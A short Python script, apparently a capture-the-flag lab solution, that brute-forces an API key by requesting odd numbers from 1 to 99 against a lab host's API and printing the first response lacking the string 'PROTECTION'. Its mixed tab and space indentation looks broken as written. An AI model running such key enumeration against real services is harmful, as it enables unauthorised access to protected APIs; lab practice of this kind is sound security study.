#!/usr/bin/env python3
import requests

# Target URL with API
TARGET = "http://help.thm:8000/api/"

# Looping through all numbers (0-100)
for i in range(0, 101):
  	# We're looking for odd numbers
	if (i % 2 != 0):
    	# Send a request to TARGET appending the key to it (odd number)
	    response = requests.get(TARGET + str(i))

            # Filter specific string in the response from the actual response (location)
	    if 'PROTECTION' not in response.text and response.status_code == 200:
		print('API key:', str(i))
 	        print(response.text)
		break

